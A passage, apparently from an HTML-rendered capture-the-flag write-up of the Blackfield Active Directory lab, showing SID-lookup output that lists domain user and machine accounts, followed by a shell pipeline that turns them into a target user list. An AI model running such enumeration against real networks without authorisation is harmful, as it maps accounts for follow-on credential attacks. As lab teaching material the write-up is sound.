+</span></span><span style="display:flex;"><span>1352: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD112766 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1353: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD978938 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1354: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD871753 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1355: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD136203 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1356: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD634593 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1357: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD274367 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1358: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD520852 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1359: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD339143 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1360: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD684814 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1361: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD792484 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1362: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD802875 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1363: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD383108 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1364: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD318250 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1365: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD496547 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1366: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD219914 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1367: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD454313 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1368: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD460131 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1369: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD613771 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1370: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD632329 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1371: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD402639 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1372: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD235930 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1373: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD246388 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1374: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD946435 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1375: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD739227 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1376: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD827906 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1377: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD198927 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1378: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD169876 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1379: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD150357 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1380: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD594619 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1381: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD274109 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1382: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD682949 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1383: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD316850 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1384: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD884808 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1385: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD327610 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1386: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD899238 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1387: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD184493 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1388: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD631162 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1389: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD591846 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1390: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD896715 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1391: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD500073 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1392: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD584113 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1393: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD204805 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1394: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD842593 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1395: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD397679 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1396: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD842438 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1397: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD286615 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1398: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD224839 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1399: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD631599 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1400: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD247450 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1401: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD290582 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1402: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD657263 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1403: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD314351 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1404: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD434395 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1405: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD410243 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1406: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD307633 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1407: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD758945 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1408: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD541148 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1409: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD532412 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1410: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD996878 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1411: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD653097 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1412: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD438814 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1413: BLACKFIELD<span style="color:#ae81ff">\s</span>vc_backup <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1414: BLACKFIELD<span style="color:#ae81ff">\l</span>ydericlefebvre <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1415: BLACKFIELD<span style="color:#ae81ff">\P</span>C01$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1416: BLACKFIELD<span style="color:#ae81ff">\P</span>C02$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1417: BLACKFIELD<span style="color:#ae81ff">\P</span>C03$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1418: BLACKFIELD<span style="color:#ae81ff">\P</span>C04$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1419: BLACKFIELD<span style="color:#ae81ff">\P</span>C05$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1420: BLACKFIELD<span style="color:#ae81ff">\P</span>C06$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1421: BLACKFIELD<span style="color:#ae81ff">\P</span>C07$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1422: BLACKFIELD<span style="color:#ae81ff">\P</span>C08$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1423: BLACKFIELD<span style="color:#ae81ff">\P</span>C09$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1424: BLACKFIELD<span style="color:#ae81ff">\P</span>C10$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1425: BLACKFIELD<span style="color:#ae81ff">\P</span>C11$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1426: BLACKFIELD<span style="color:#ae81ff">\P</span>C12$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1427: BLACKFIELD<span style="color:#ae81ff">\P</span>C13$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1428: BLACKFIELD<span style="color:#ae81ff">\S</span>RV-WEB$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1429: BLACKFIELD<span style="color:#ae81ff">\S</span>RV-FILE$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1430: BLACKFIELD<span style="color:#ae81ff">\S</span>RV-EXCHANGE$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1431: BLACKFIELD<span style="color:#ae81ff">\S</span>RV-INTRANET$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep SidType Lookupsid_result.txt | awk -F <span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span> | awk -F <span style="color:#e6db74">&#39;(&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span>  | tee Directory/users.txt
+</span></span><span style="display:flex;"><span>Enterprise Read-only Domain Controllers 
+</span></span><span style="display:flex;"><span>Administrator 
+</span></span><span style="display:flex;"><span>Guest 
+</span></span><span style="display:flex;"><span>krbtgt 
+</span></span><span style="display:flex;"><span>Domain Admins 
+</span></span><span style="display:flex;"><span>Domain Users 
+</span></span><span style="display:flex;"><span>Domain Guests 
+</span></span><span style="display:flex;"><span>Domain Computers 
+</span></span><span style="display:flex;"><span>Domain Controllers 
+</span></span><span style="display:flex;"><span>Cert Publishers 
+</span></span><span style="display:flex;"><span>Schema Admins 
+</span></span><span style="display:flex;"><span>Enterprise Admins 
+</span></span><span style="display:flex;"><span>Group Policy Creator Owners 
+</span></span><span style="display:flex;"><span>Read-only Domain Controllers 
+</span></span><span style="display:flex;"><span>Cloneable Domain Controllers 
+</span></span><span style="display:flex;"><span>Protected Users 
+</span></span><span style="display:flex;"><span>Key Admins 
+</span></span><span style="display:flex;"><span>Enterprise Key Admins 
+</span></span><span style="display:flex;"><span>RAS and IAS Servers 
+</span></span><span style="display:flex;"><span>Allowed RODC Password Replication Group 
+</span></span><span style="display:flex;"><span>Denied RODC Password Replication Group 
+</span></span><span style="display:flex;"><span>DC01$ 
+</span></span><span style="display:flex;"><span>DnsAdmins 
+</span></span><span style="display:flex;"><span>DnsUpdateProxy 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div>
             </div>
         </article>
